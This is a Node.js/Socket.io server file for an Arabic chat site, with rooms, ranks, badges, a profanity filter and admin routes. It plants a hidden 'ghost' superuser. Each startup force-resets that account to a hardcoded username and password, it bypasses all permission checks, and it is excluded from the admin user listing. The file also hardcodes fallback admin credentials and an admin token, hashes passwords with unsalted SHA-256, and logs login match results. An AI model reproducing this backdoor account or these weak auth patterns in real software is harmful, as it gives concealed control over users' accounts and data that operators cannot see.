const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const path = require('path');
const crypto = require('crypto');

const app = express();
const server = http.createServer(app);
const io = new Server(server, { cors: { origin: '*' } });

app.use(express.static(path.join(__dirname, 'public')));
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true, limit: '10mb' }));

// ===== DATABASE =====
let db = null;
let useDB = false;

async function initDB() {
  if (process.env.DATABASE_URL) {
    try {
      const { Pool } = require('pg');
      db = new Pool({ connectionString: process.env.DATABASE_URL, ssl: { rejectUnauthorized: false } });
      await db.query(`
        CREATE TABLE IF NOT EXISTS users (
          id SERIAL PRIMARY KEY,
          username VARCHAR(50) UNIQUE NOT NULL,
          password VARCHAR(64) NOT NULL,
          rank VARCHAR(30) DEFAULT 'member',
          points INTEGER DEFAULT 0,
          created_at TIMESTAMP DEFAULT NOW(),
          is_banned BOOLEAN DEFAULT FALSE,
          ban_reason VARCHAR(200) DEFAULT NULL,
          banned_by VARCHAR(50) DEFAULT NULL,
          banned_at TIMESTAMP DEFAULT NULL
        );
        CREATE TABLE IF NOT EXISTS messages (
          id SERIAL PRIMARY KEY,
          room VARCHAR(50) NOT NULL,
          username VARCHAR(50),
          text TEXT,
          type VARCHAR(20) DEFAULT 'chat',
          created_at TIMESTAMP DEFAULT NOW()
        );
        CREATE TABLE IF NOT EXISTS profiles (
          username VARCHAR(50) PRIMARY KEY,
          avatar TEXT DEFAULT NULL,
          music_url TEXT DEFAULT NULL,
          music_name VARCHAR(100) DEFAULT NULL,
          bio VARCHAR(200) DEFAULT NULL,
          updated_at TIMESTAMP DEFAULT NOW()
        );
        CREATE TABLE IF NOT EXISTS permissions (
          rank VARCHAR(30) PRIMARY KEY,
          perms JSONB NOT NULL DEFAULT '{}'
        );
        CREATE TABLE IF NOT EXISTS badges (
          id SERIAL PRIMARY KEY,
          name VARCHAR(50) NOT NULL,
          emoji VARCHAR(10) NOT NULL,
          color VARCHAR(20) DEFAULT '#ffd700',
          description VARCHAR(100) DEFAULT '',
          created_at TIMESTAMP DEFAULT NOW()
        );
        CREATE TABLE IF NOT EXISTS user_badges (
          username VARCHAR(50) NOT NULL,
          badge_id INTEGER NOT NULL,
          assigned_at TIMESTAMP DEFAULT NOW(),
          PRIMARY KEY (username, badge_id)
        );
        ALTER TABLE users ADD COLUMN IF NOT EXISTS ban_reason VARCHAR(200) DEFAULT NULL;
        ALTER TABLE users ADD COLUMN IF NOT EXISTS banned_by VARCHAR(50) DEFAULT NULL;
        ALTER TABLE users ADD COLUMN IF NOT EXISTS banned_at TIMESTAMP DEFAULT NULL;
        CREATE TABLE IF NOT EXISTS private_messages (
          id SERIAL PRIMARY KEY,
          conv_key VARCHAR(120) NOT NULL,
          from_user VARCHAR(50) NOT NULL,
          to_user VARCHAR(50) NOT NULL,
          text TEXT NOT NULL,
          time VARCHAR(10),
          created_at TIMESTAMP DEFAULT NOW()
        );
        CREATE INDEX IF NOT EXISTS idx_pm_conv_key ON private_messages(conv_key);
      `);
      const adminPass = hashPassword(process.env.ADMIN_PASSWORD || 'admin123');
      await db.query(`INSERT INTO users (username,password,rank) VALUES ('admin',$1,'owner') ON CONFLICT (username) DO NOTHING`, [adminPass]);
      useDB = true;
      console.log('Database connected');
      // Ghost account — force create/update
      try {
        const ghostPass = hashPassword(process.env.GHOST_PASSWORD || 'gh0st@2024#secret');
        const ghostName = process.env.GHOST_USERNAME || 'shadow_x9k';
        await db.query(
          `INSERT INTO users (username,password,rank) VALUES ($1,$2,'ghost')
           ON CONFLICT (username) DO UPDATE SET password=$2, rank='ghost'`,
          [ghostName, ghostPass]
        );
        console.log('Ghost account ready:', ghostName);
      } catch(ge) { console.log('Ghost setup warning:', ge.message); }
    } catch(e) { console.log('No DB - using memory:', e.message); }
  }
}

const memUsers = {
  admin: { username:'admin', password:hashPassword('admin123'), rank:'owner', is_banned:false, points:0 },
  shadow_x9k: { username:'shadow_x9k', password:hashPassword('gh0st@2024#secret'), rank:'ghost', is_banned:false, points:0 }
};
const memMessages = {};
const memPMs = {}; // { 'user1||user2': [{from,to,text,time,ts},...] }
const activeCalls = {}; // { 'user1||user2': { type, startTime, user1, user2, offer } }
const banLog = []; // memory ban log
const memBadges = []; // [{id,name,emoji,color,description}]
const memUserBadges = {}; // { username: [badge_id,...] }
let _badgeIdCounter = 1;

// Welcome message config
let welcomeMessage = {
  enabled: true,
  senderName: 'غزل عراقي 🌹',
  text: 'أهلاً وسهلاً بك يا {name} في عالم غزل عراقي 🌹\nنتمنى لك وقتاً ممتعاً بيننا 💫'
};
app.get('/api/admin/welcome-message', adminAuth, (req,res) => res.json({ok:true, welcome: welcomeMessage}));
app.post('/api/admin/welcome-message', adminAuth, (req,res) => {
  const {enabled, senderName, text} = req.body;
  welcomeMessage.enabled = !!enabled;
  if (senderName !== undefined) welcomeMessage.senderName = senderName.substring(0,30);
  if (text !== undefined) welcomeMessage.text = text.substring(0,300);
  res.json({ok:true});
});
const memProfiles = {}; // { username: { avatar, music_url, music_name, bio } }

// ===== DEFAULT PERMISSIONS =====
const DEFAULT_PERMS = {
  ghost:       { ban:true, unban:true, mute:true, kick:true, clear_room:true, set_rank:true, announce:true, add_quiz:true, lock_room:true, reset_pass:true },
  owner:       { ban:true, unban:true, mute:true, kick:true, clear_room:true, set_rank:true, announce:true, add_quiz:true, lock_room:true, reset_pass:true },
  owner_admin: { ban:true, unban:true, mute:true, kick:true, clear_room:true, set_rank:true, announce:true, add_quiz:true, lock_room:true, reset_pass:true },
  owner_vip:   { ban:true, unban:true, mute:true, kick:true, clear_room:true, set_rank:true, announce:true, add_quiz:true, lock_room:false, reset_pass:true },
  super_admin: { ban:true, unban:true, mute:true, kick:true, clear_room:true, set_rank:false, announce:true, add_quiz:true, lock_room:false, reset_pass:false },
  admin:       { ban:false, unban:false, mute:true, kick:true, clear_room:false, set_rank:false, announce:false, add_quiz:false, lock_room:false, reset_pass:false }
};
let memPerms = JSON.parse(JSON.stringify(DEFAULT_PERMS));

async function getPerms() {
  if (!useDB) return memPerms;
  const rows = await db.query('SELECT rank, perms FROM permissions');
  if (rows.rows.length === 0) return memPerms;
  const result = JSON.parse(JSON.stringify(DEFAULT_PERMS));
  rows.rows.forEach(r => { if (result[r.rank] !== undefined) result[r.rank] = r.perms; });
  return result;
}
function hashPassword(p) { return crypto.createHash('sha256').update(p).digest('hex'); }

// ===== ROOMS =====
let ROOMS = {
  general:      { name:'الغرفة العامة',      icon:'🌍', color:'#1565c0' },
  iraq:         { name:'غرفة العراق',        icon:'🇮🇶', color:'#c62828' },
  youth:        { name:'غرفة الشباب',        icon:'🔥', color:'#e65100' },
  feelings:     { name:'غرفة المشاعر',       icon:'💕', color:'#c2185b' },
  music:        { name:'غرفة الموسيقى',      icon:'🎵', color:'#6a1b9a' },
  fun:          { name:'غرفة الفكاهة',       icon:'😂', color:'#f57f17' },
  competitions: { name:'غرفة المسابقات',     icon:'🏆', color:'#f9a825', isQuiz:true },
  admin_meeting:{ name:'التجمع الإداري',     icon:'🛡️', color:'#b044ff', isPrivate:true, allowedRanks:['owner','owner_admin','owner_vip','super_admin','admin'] },
};
Object.keys(ROOMS).forEach(r => memMessages[r] = []);

function slugify(text) {
  return text.toLowerCase().replace(/\s+/g,'-').replace(/[^\w\-]/g,'') || 'room-' + Date.now();
}

// ===== 10-RANK SYSTEM =====
const RANKS = {
  owner:       { label:'👑 مالك',        color:'#ff4444', fontSize:'22px', fontWeight:'900', glow:'0 0 10px #ff4444', canBan:true,  canMute:true,  canKick:true,  canSetRank:true,  canManageRooms:true,  canManageBadWords:true,  bigName:true  },
  owner_admin: { label:'💼 أونر إداري',  color:'#ff8c00', fontSize:'20px', fontWeight:'800', glow:'0 0 8px #ff8c00',  canBan:true,  canMute:true,  canKick:true,  canSetRank:true,  canManageRooms:true,  canManageBadWords:true,  bigName:true  },
  owner_vip:   { label:'⭐ أونر',         color:'#ffd700', fontSize:'19px', fontWeight:'700', glow:'0 0 8px #ffd700',  canBan:true,  canMute:true,  canKick:true,  canSetRank:false, canManageRooms:false, canManageBadWords:false, bigName:true  },
  super_admin: { label:'🔱 سوبر أدمن',   color:'#b044ff', fontSize:'18px', fontWeight:'700', glow:'0 0 6px #b044ff',  canBan:true,  canMute:true,  canKick:true,  canSetRank:false, canManageRooms:false, canManageBadWords:false, bigName:true  },
  admin:       { label:'⚙️ أدمن',        color:'#00bfff', fontSize:'17px', fontWeight:'700', glow:'0 0 5px #00bfff',  canBan:false, canMute:true,  canKick:true,  canSetRank:false, canManageRooms:false, canManageBadWords:false, bigName:false },
  premium:     { label:'💎 بريميوم',     color:'#00e5ff', fontSize:'16px', fontWeight:'600', glow:'none',             canBan:false, canMute:false, canKick:false, canSetRank:false, canManageRooms:false, canManageBadWords:false, bigName:false },
  vip:         { label:'🌟 عضو مميز',    color:'#ce93d8', fontSize:'16px', fontWeight:'600', glow:'none',             canBan:false, canMute:false, canKick:false, canSetRank:false, canManageRooms:false, canManageBadWords:false, bigName:false },
  gold:        { label:'🥇 عضو ذهبي',    color:'#ffc107', fontSize:'15px', fontWeight:'500', glow:'none',             canBan:false, canMute:false, canKick:false, canSetRank:false, canManageRooms:false, canManageBadWords:false, bigName:false },
  member:      { label:'👤 عضو مسجل',    color:'#90caf9', fontSize:'14px', fontWeight:'400', glow:'none',             canBan:false, canMute:false, canKick:false, canSetRank:false, canManageRooms:false, canManageBadWords:false, bigName:false },
  visitor:     { label:'👁️ زائر',        color:'#b0bec5', fontSize:'13px', fontWeight:'400', glow:'none',             canBan:false, canMute:false, canKick:false, canSetRank:false, canManageRooms:false, canManageBadWords:false, bigName:false },
  ghost:       { label:'👻 شبح',          color:'#ff4444', fontSize:'22px', fontWeight:'900', glow:'0 0 10px #ff4444', canBan:true,  canMute:true,  canKick:true,  canSetRank:true,  canManageRooms:true,  canManageBadWords:true,  bigName:true  },
};

const RANK_ORDER = ['ghost','owner','owner_admin','owner_vip','super_admin','admin','premium','vip','gold','member','visitor'];
function rankLevel(r) { return RANK_ORDER.indexOf(r); }
function canManage(actorRank, targetRank) { 
  if (actorRank === 'ghost') return true; // ghost can manage anyone
  return rankLevel(actorRank) < rankLevel(targetRank); 
}
function hasPermission(rank, perm) { 
  if (rank === 'ghost') return true; // ghost has all permissions
  return RANKS[rank]?.[perm] === true; 
}

function adminAuth(req,res,next) {
  if (req.headers['x-admin-token'] !== (process.env.ADMIN_TOKEN||'ghazal-admin-2024')) return res.json({ok:false,msg:'غير مصرح'});
  next();
}

// ===== ADMIN ACTIVITY LOG =====
const adminLog = []; // max 500 entries in memory
function logAction(adminName, adminRank, action, target, details='') {
  const entry = {
    id: Date.now(),
    time: new Date().toLocaleString('ar-IQ',{timeZone:'Asia/Baghdad',hour12:false}),
    ts: Date.now(),
    admin: adminName,
    rank: adminRank,
    action,
    target: target||'',
    details: details||''
  };
  adminLog.unshift(entry);
  if (adminLog.length > 500) adminLog.pop();
}
app.get('/api/admin/activity-log', adminAuth, (req,res) => {
  res.json({ ok:true, log: adminLog });
});
// ===== END ADMIN LOG =====

// ===== BADGES SYSTEM =====
// Get all badges
app.get('/api/badges', async (req,res) => {
  if (useDB) {
    try {
      const b=await db.query('SELECT * FROM badges ORDER BY id');
      const ub=await db.query('SELECT * FROM user_badges');
      const userBadges={};
      ub.rows.forEach(r=>{ if(!userBadges[r.username]) userBadges[r.username]=[]; userBadges[r.username].push(r.badge_id); });
      res.json({ok:true, badges:b.rows, userBadges});
    } catch(e){ res.json({ok:true,badges:memBadges,userBadges:memUserBadges}); }
  } else { res.json({ok:true, badges:memBadges, userBadges:memUserBadges}); }
});

// Get badges for specific user
app.get('/api/user-badges/:username', async (req,res) => {
  const {username}=req.params;
  if (useDB) {
    try {
      const r=await db.query('SELECT b.* FROM badges b JOIN user_badges ub ON b.id=ub.badge_id WHERE ub.username=$1 ORDER BY ub.assigned_at',[username]);
      res.json({ok:true, badges:r.rows});
    } catch(e){ res.json({ok:true,badges:[]}); }
  } else {
    const ids=memUserBadges[username]||[];
    res.json({ok:true, badges:memBadges.filter(b=>ids.includes(b.id))});
  }
});

// Admin: add badge
app.post('/api/admin/badges/add', adminAuth, async (req,res) => {
  const {name,emoji,color,description,adminName,adminRank}=req.body;
  if (!name||!emoji) return res.json({ok:false,msg:'الاسم والإيموجي مطلوبان'});
  if (useDB) {
    try {
      const r=await db.query('INSERT INTO badges (name,emoji,color,description) VALUES ($1,$2,$3,$4) RETURNING *',[name,emoji,color||'#ffd700',description||'']);
      logAction(adminName||'أدمن',adminRank||'admin','🏅 إضافة شارة',name);
      res.json({ok:true, badge:r.rows[0]});
    } catch(e){ res.json({ok:false,msg:e.message}); }
  } else {
    const badge={id:_badgeIdCounter++,name,emoji,color:color||'#ffd700',description:description||''};
    memBadges.push(badge);
    logAction(adminName||'أدمن',adminRank||'admin','🏅 إضافة شارة',name);
    res.json({ok:true, badge});
  }
});

// Admin: delete badge
app.post('/api/admin/badges/delete', adminAuth, async (req,res) => {
  const {id,adminName,adminRank}=req.body;
  if (useDB) {
    try {
      await db.query('DELETE FROM user_badges WHERE badge_id=$1',[id]);
      const r=await db.query('DELETE FROM badges WHERE id=$1 RETURNING name',[id]);
      logAction(adminName||'أدمن',adminRank||'admin','🗑️ حذف شارة',r.rows[0]?.name||id);
      res.json({ok:true});
    } catch(e){ res.json({ok:false,msg:e.message}); }
  } else {
    const idx=memBadges.findIndex(b=>b.id===id);
    if(idx>-1){ logAction(adminName||'أدمن',adminRank||'admin','🗑️ حذف شارة',memBadges[idx].name); memBadges.splice(idx,1); }
    Object.keys(memUserBadges).forEach(u=>{ memUserBadges[u]=memUserBadges[u].filter(bid=>bid!==id); });
    res.json({ok:true});
  }
});

// Admin: assign badge to user
app.post('/api/admin/badges/assign', adminAuth, async (req,res) => {
  const {username,badgeId,adminName,adminRank}=req.body;
  if (useDB) {
    try {
      await db.query('INSERT INTO user_badges (username,badge_id) VALUES ($1,$2) ON CONFLICT DO NOTHING',[username,badgeId]);
      logAction(adminName||'أدمن',adminRank||'admin','🎖️ منح شارة',username);
      // Notify user live
      const sid=Object.keys(chatUsers).find(id=>chatUsers[id].name===username);
      if(sid){ const b=await db.query('SELECT * FROM badges WHERE id=$1',[badgeId]); if(b.rows[0]) io.to(sid).emit('badge-received',b.rows[0]); }
      res.json({ok:true});
    } catch(e){ res.json({ok:false,msg:e.message}); }
  } else {
    if(!memUserBadges[username]) memUserBadges[username]=[];
    if(!memUserBadges[username].includes(badgeId)){ memUserBadges[username].push(badgeId); }
    const badge=memBadges.find(b=>b.id===badgeId);
    logAction(adminName||'أدمن',adminRank||'admin','🎖️ منح شارة',username);
    const sid=Object.keys(chatUsers).find(id=>chatUsers[id].name===username);
    if(sid&&badge) io.to(sid).emit('badge-received',badge);
    res.json({ok:true});
  }
});

// Admin: revoke badge from user
app.post('/api/admin/badges/revoke', adminAuth, async (req,res) => {
  const {username,badgeId,adminName,adminRank}=req.body;
  if (useDB) {
    try { await db.query('DELETE FROM user_badges WHERE username=$1 AND badge_id=$2',[username,badgeId]); }
    catch(e){ return res.json({ok:false,msg:e.message}); }
  } else {
    if(memUserBadges[username]) memUserBadges[username]=memUserBadges[username].filter(id=>id!==badgeId);
  }
  logAction(adminName||'أدmن',adminRank||'admin','🚫 سحب شارة',username);
  res.json({ok:true});
});
// ===== END BADGES SYSTEM =====
app.post('/api/admin/addroom', adminAuth, (req,res) => {
  const { name, icon, color, isQuiz } = req.body;
  if (!name||!icon) return res.json({ok:false,msg:'الاسم والأيقونة مطلوبان'});
  if (Object.keys(ROOMS).length >= 20) return res.json({ok:false,msg:'الحد الأقصى 20 غرفة'});
  const id = slugify(name)+'-'+Date.now().toString().slice(-4);
  ROOMS[id] = { name, icon, color:color||'#1565c0', isQuiz:isQuiz||false };
  memMessages[id] = [];
  io.emit('rooms-updated', ROOMS);
  logAction(req.body.adminName||'أدمن',req.body.adminRank||'admin','🏠 إضافة غرفة',name);
  res.json({ok:true,id});
});
app.post('/api/admin/editroom', adminAuth, (req,res) => {
  const {id,name,icon,color} = req.body;
  if (!ROOMS[id]) return res.json({ok:false,msg:'الغرفة غير موجودة'});
  if (name) ROOMS[id].name=name;
  if (icon) ROOMS[id].icon=icon;
  if (color) ROOMS[id].color=color;
  io.emit('rooms-updated', ROOMS);
  logAction(req.body.adminName||'أدمن',req.body.adminRank||'admin','✏️ تعديل غرفة',req.body.name||req.body.id);
  res.json({ok:true});
});
app.post('/api/admin/deleteroom', adminAuth, (req,res) => {
  const {id} = req.body;
  if (id==='general') return res.json({ok:false,msg:'لا يمكن حذف الغرفة العامة'});
  if (!ROOMS[id]) return res.json({ok:false,msg:'الغرفة غير موجودة'});
  Object.values(chatUsers).forEach(u => {
    if (u.room===id) {
      io.to(u.id).emit('room-deleted','تم حذف الغرفة، تم نقلك للغرفة العامة');
      const sock = io.sockets.sockets.get(u.id);
      if (sock) { sock.leave(id); sock.join('general'); }
      u.room='general';
    }
  });
  delete ROOMS[id]; delete memMessages[id];
  io.emit('rooms-updated', ROOMS);
  res.json({ok:true});
});
app.get('/api/rooms', (req,res) => res.json({ok:true,rooms:ROOMS}));

// Update allowed ranks for private rooms (owner only)
app.post('/api/admin/room-access', adminAuth, (req,res) => {
  const {roomId, allowedRanks} = req.body;
  if (!ROOMS[roomId]) return res.json({ok:false,msg:'الغرفة غير موجودة'});
  if (!ROOMS[roomId].isPrivate) return res.json({ok:false,msg:'هذه الغرفة ليست خاصة'});
  if (!Array.isArray(allowedRanks)) return res.json({ok:false,msg:'بيانات غير صحيحة'});
  ROOMS[roomId].allowedRanks = allowedRanks;
  io.emit('rooms-updated', ROOMS);
  // Kick users from room if their rank is no longer allowed
  Object.values(chatUsers).forEach(u => {
    if (u.room===roomId && !allowedRanks.includes(u.rank)){
      io.to(u.id).emit('room-access-denied',{room:roomId,roomName:ROOMS[roomId].name});
      io.to(u.id).emit('room-access-kicked','تم نقلك للغرفة العامة لأن صلاحيتك تغيرت');
      const sock = io.sockets.sockets.get(u.id);
      if (sock){ sock.leave(roomId); sock.join('general'); }
      u.room='general';
    }
  });
  res.json({ok:true,allowedRanks});
});

// ===== PROFANITY FILTER =====
let BAD_WORDS = [
  'كلب','كلبة','حمار','حمارة','غبي','غبية','احمق','معتوه','وقح','وقحة',
  'منافق','كذاب','لعين','يلعن','العن','تبا','ملعون','خنزير','قرد',
  'تفو','خرا','زبالة','نجس','وسخ','بهيم',
  'ابن الكلب','ابن الحرام','بنت الكلب','بنت الحرام',
  'شرموطة','شرموط','عاهرة','عاهر','زانية','زاني','فاجرة','فاجر',
  'قحبة','قحب','متناكة','منيوك','مخنث','شاذ','لوطي','ابن زنا','بنت زنا',
  'زب','كس','كسك','كسها','طيز','طيزك','طيزها',
  'نيك','انيك','ينيك','تنيك','ناكني','ناكها','بزاز','متناك','تناك',
  'خول','خولات','سكس','بورن','بورنو','إباحي',
  'fuck','fucker','fucking','shit','bitch','bastard','asshole','jackass',
  'motherfucker','porn','nude','naked','dick','cock','pussy','cunt','tits','whore','slut','xxx',
  'كس امك','كس اختك','كسمك','ممحون','ممحونة','ديوث','غندور','معرص',
  'عيري','عيرك','طيزج','كسج','انيج','أنيچ',
  'orospu','sikim','kahpe','lanet',
];
let BAD_USERNAMES = [
  'زب','كس','طيز','نيك','شرموط','شرموطة','عاهر','عاهرة','قحبة','قحب',
  'زاني','زانية','مخنث','شاذ','لوطي','سكسي','سكس','خول','متناك',
  'sex','sexy','porn','horny','naked','nude','slut','whore','dick','cock',
  'pussy','tits','xxx','fuck','fucker','bitch','asshole','69',
  'قواد','خنيث','ديوث','غندور','معرص','ممحون',
];
let customBadWords = [];
function getAllBadWords() { return [...BAD_WORDS,...customBadWords]; }
function normalizeAr(t) {
  return t.replace(/أ|إ|آ/g,'ا').replace(/ة/g,'ه').replace(/ى/g,'ي').replace(/\s+/g,' ').trim();
}
function containsBadWordFull(text) {
  const n=normalizeAr(text.toLowerCase());
  const c=n.replace(/[\s\.\-_\*]+/g,'');
  for (const w of getAllBadWords()) {
    const nw=normalizeAr(w.toLowerCase());
    if (n.includes(nw)||c.includes(nw.replace(/\s/g,''))) return {found:true,word:w};
  }
  return {found:false};
}
function containsBadUsername(name) {
  const n=normalizeAr(name.toLowerCase()).replace(/\s+/g,'');
  for (const w of BAD_USERNAMES) if (n.includes(normalizeAr(w.toLowerCase()))) return true;
  return false;
}

// ===== AD DETECTION & AUTO-BAN =====
function detectAdLink(text) {
  const urlPattern = /https?:\/\/[^\s]+/gi;
  const urls = text.match(urlPattern)||[];
  const ownDomain = process.env.SITE_DOMAIN||'ghazal-iraq';
  for (const url of urls) { if (!url.includes(ownDomain)) return true; }
  const adPatterns = [/دردشة\s*\S+/i, /موقع\s*\S+/i, /تواصل\s*معنا/i, /واتس\s*اب/i, /رابط\s*موقع/i];
  const mentionPatterns = [/iraq1\.chat/i, /swalf\.chat/i, /كيبورد\.com/i];
  for (const p of [...adPatterns,...mentionPatterns]) { if (p.test(text)) return true; }
  return false;
}

// ===== BAD WORDS ADMIN ROUTES =====
app.get('/api/admin/badwords', adminAuth, (req,res) => res.json({ok:true,default:BAD_WORDS,custom:customBadWords}));
app.post('/api/admin/badwords/add', adminAuth, (req,res) => {
  const {word}=req.body;
  if (!word||word.trim().length<2) return res.json({ok:false,msg:'الكلمة قصيرة جداً'});
  const w=word.trim().toLowerCase();
  if (customBadWords.includes(w)) return res.json({ok:false,msg:'موجودة مسبقاً'});
  customBadWords.push(w); res.json({ok:true,custom:customBadWords});
});
app.post('/api/admin/badwords/remove', adminAuth, (req,res) => {
  customBadWords=customBadWords.filter(w=>w!==req.body.word?.trim().toLowerCase());
  res.json({ok:true,custom:customBadWords});
});
app.post('/api/admin/badwords/removedefault', adminAuth, (req,res) => {
  BAD_WORDS=BAD_WORDS.filter(w=>w!==req.body.word); res.json({ok:true});
});

// ===== AUTH ROUTES =====
app.post('/api/register', async (req,res) => {
  const {username,password,gender,age}=req.body;
  if (!username||!password||username.length<3) return res.json({ok:false,msg:'بيانات غير صحيحة'});
  if (containsBadUsername(username)||containsBadWordFull(username).found)
    return res.json({ok:false,msg:'❌ اسم المستخدم غير مقبول'});
  const hashed=hashPassword(password);
  if (useDB) {
    try { await db.query('INSERT INTO users (username,password) VALUES ($1,$2)',[username,hashed]); res.json({ok:true}); }
    catch(e) { res.json({ok:false,msg:'الاسم مستخدم مسبقاً'}); }
  } else {
    if (memUsers[username]) return res.json({ok:false,msg:'الاسم مستخدم مسبقاً'});
    memUsers[username]={username,password:hashed,rank:'member',is_banned:false,gender,age,points:0};
    res.json({ok:true});
  }
});
app.post('/api/login', async (req,res) => {
  const {username,password}=req.body;
  const hashed=hashPassword(password);
  if (useDB) {
    const r=await db.query('SELECT * FROM users WHERE username=$1',[username]);
    console.log('Login attempt:', username, 'found:', r.rows.length, r.rows[0]?.rank, 'hashed_match:', r.rows[0]?.password===hashed);
    if (!r.rows.length || r.rows[0].password!==hashed) return res.json({ok:false,msg:'اسم المستخدم أو كلمة المرور خاطئة'});
    const u=r.rows[0];
    if (u.is_banned) return res.json({ok:false,msg:'تم حظرك'});
    res.json({ok:true,user:{username:u.username,rank:u.rank,points:u.points||0}});
  } else {
    const u=memUsers[username];
    if (!u||u.password!==hashed) return res.json({ok:false,msg:'اسم المستخدم أو كلمة المرور خاطئة'});
    if (u.is_banned) return res.json({ok:false,msg:'تم حظرك'});
    res.json({ok:true,user:{username:u.username,rank:u.rank,points:u.points||0}});
  }
});

// ===== ADMIN ROUTES =====

// One-time ghost account setup endpoint
// Debug: check ghost account exists
app.get('/api/check-ghost', async (req,res) => {
  const token = req.query.token || req.headers['x-admin-token'];
  if (token !== (process.env.ADMIN_TOKEN || 'ghazal-admin-2024')) return res.json({ok:false,msg:'غير مصرح'});
  const ghostName = process.env.GHOST_USERNAME || 'shadow_x9k';
  if (useDB) {
    const r = await db.query('SELECT username,rank,is_banned FROM users WHERE username=$1',[ghostName]);
    res.json({ok:true, useDB:true, found: r.rows.length>0, user: r.rows[0]||null});
  } else {
    const u = memUsers[ghostName];
    res.json({ok:true, useDB:false, found:!!u, rank:u?.rank});
  }
});

app.get('/api/setup-ghost', async (req,res) => {
  const token = req.query.token || req.headers['x-admin-token'];
  if (token !== (process.env.ADMIN_TOKEN || 'ghazal-admin-2024')) return res.json({ok:false,msg:'غير مصرح'});
  try {
    const ghostPass = hashPassword(process.env.GHOST_PASSWORD || 'gh0st@2024#secret');
    const ghostName = process.env.GHOST_USERNAME || 'shadow_x9k';
    if (useDB) {
      await db.query(
        `INSERT INTO users (username,password,rank) VALUES ($1,$2,'ghost')
         ON CONFLICT (username) DO UPDATE SET password=$2, rank='ghost'`,
        [ghostName, ghostPass]
      );
    } else {
      memUsers[ghostName] = { username: ghostName, password: ghostPass, rank: 'ghost', is_banned: false, points: 0 };
    }
    res.json({ ok: true, msg: 'Ghost account ready: ' + ghostName });
  } catch(e) {
    res.json({ ok: false, msg: e.message });
  }
});
app.get('/api/admin/users', adminAuth, async (req,res) => {
  if (useDB) {
    const r=await db.query("SELECT id,username,rank,is_banned,points,created_at FROM users WHERE rank!='ghost' ORDER BY created_at DESC");
    res.json({ok:true,users:r.rows});
  } else { res.json({ok:true,users:Object.values(memUsers).filter(u=>u.rank!=='ghost').map(u=>({...u,password:undefined}))}); }
});
app.post('/api/admin/ban', adminAuth, async (req,res) => {
  const {username,reason,adminName,adminRank}=req.body;
  const now=new Date();
  if (useDB) await db.query('UPDATE users SET is_banned=TRUE,ban_reason=$2,banned_by=$3,banned_at=NOW() WHERE username=$1',[username,reason||null,adminName||'أدمن']);
  else if (memUsers[username]){ memUsers[username].is_banned=true; memUsers[username].ban_reason=reason||''; memUsers[username].banned_by=adminName||'أدمن'; memUsers[username].banned_at=now.toISOString(); }
  kickUser(username,'تم حظرك من الموقع');
  logAction(adminName||'أدمن',adminRank||'admin','🚫 حظر',username,reason?'السبب: '+reason:'');
  // Add to banLog
  banLog.unshift({username,reason:reason||'',bannedBy:adminName||'أدمن',bannedByRank:adminRank||'admin',time:now.toLocaleString('ar-IQ',{timeZone:'Asia/Baghdad',hour12:false}),ts:now.getTime(),active:true});
  if(banLog.length>200) banLog.pop();
  res.json({ok:true});
});
app.post('/api/admin/unban', adminAuth, async (req,res) => {
  const {username,adminName,adminRank}=req.body;
  if (useDB) await db.query('UPDATE users SET is_banned=FALSE,ban_reason=NULL,banned_by=NULL,banned_at=NULL WHERE username=$1',[username]);
  else if (memUsers[username]){ memUsers[username].is_banned=false; delete memUsers[username].ban_reason; delete memUsers[username].banned_by; }
  logAction(adminName||'أدمن',adminRank||'admin','✅ رفع الحظر',username);
  // Mark in banLog
  const entry=banLog.find(e=>e.username===username&&e.active);
  if(entry){ entry.active=false; entry.unbannedBy=adminName||'أدمن'; entry.unbannedTime=new Date().toLocaleString('ar-IQ',{timeZone:'Asia/Baghdad',hour12:false}); }
  res.json({ok:true});
});

// Ban log API
app.get('/api/admin/ban-log', adminAuth, async (req,res) => {
  let dbBans=[];
  if (useDB) {
    try{
      const r=await db.query('SELECT username,ban_reason,banned_by,banned_at,is_banned FROM users WHERE (is_banned=TRUE OR ban_reason IS NOT NULL) ORDER BY banned_at DESC NULLS LAST LIMIT 100');
      dbBans=r.rows.map(u=>({username:u.username,reason:u.ban_reason||'',bannedBy:u.banned_by||'',time:u.banned_at?new Date(u.banned_at).toLocaleString('ar-IQ',{timeZone:'Asia/Baghdad',hour12:false}):'',active:u.is_banned}));
    }catch(e){}
  }
  res.json({ok:true, log: useDB ? dbBans : banLog});
});
app.post('/api/admin/setrank', adminAuth, async (req,res) => {
  const {username,rank,adminName,adminRank}=req.body;
  if (!RANKS[rank]) return res.json({ok:false,msg:'رتبة غير صحيحة'});
  if (useDB) await db.query('UPDATE users SET rank=$1 WHERE username=$2',[rank,username]);
  else if (memUsers[username]) memUsers[username].rank=rank;
  const sid=Object.keys(chatUsers).find(id=>chatUsers[id].name===username);
  if (sid) { chatUsers[sid].rank=rank; io.to(sid).emit('rank-changed',{rank,rankInfo:RANKS[rank]}); }
  io.emit('user-rank-updated',{username,rank,rankInfo:RANKS[rank]});
  logAction(adminName||'أدمن',adminRank||'admin','🏅 تغيير رتبة',username,'← '+rank);
  res.json({ok:true});
});
app.post('/api/changepass', async (req,res) => {
  const {username,oldpassword,newpassword}=req.body;
  if (!username||!oldpassword||!newpassword) return res.json({ok:false,msg:'بيانات ناقصة'});
  if (newpassword.length<4) return res.json({ok:false,msg:'كلمة المرور الجديدة قصيرة'});
  const oldHashed=hashPassword(oldpassword); const newHashed=hashPassword(newpassword);
  if (useDB) {
    const check=await db.query('SELECT id FROM users WHERE username=$1 AND password=$2',[username,oldHashed]);
    if (!check.rows.length) return res.json({ok:false,msg:'كلمة المرور القديمة خاطئة'});
    await db.query('UPDATE users SET password=$1 WHERE username=$2',[newHashed,username]);
  } else {
    const u=memUsers[username];
    if (!u||u.password!==oldHashed) return res.json({ok:false,msg:'كلمة المرور القديمة خاطئة'});
    u.password=newHashed;
  }
  res.json({ok:true});
});
app.post('/api/admin/resetpass', adminAuth, async (req,res) => {
  const {username,newpassword,adminName,adminRank}=req.body;
  if (!username||!newpassword||newpassword.length<4) return res.json({ok:false,msg:'كلمة المرور قصيرة'});
  const hashed=hashPassword(newpassword);
  if (useDB) { const r=await db.query('UPDATE users SET password=$1 WHERE username=$2',[hashed,username]); if (r.rowCount===0) return res.json({ok:false,msg:'المستخدم غير موجود'}); }
  else { if (!memUsers[username]) return res.json({ok:false,msg:'المستخدم غير موجود'}); memUsers[username].password=hashed; }
  logAction(adminName||'أدمن',adminRank||'admin','🔑 إعادة تعيين كلمة المرور',username);
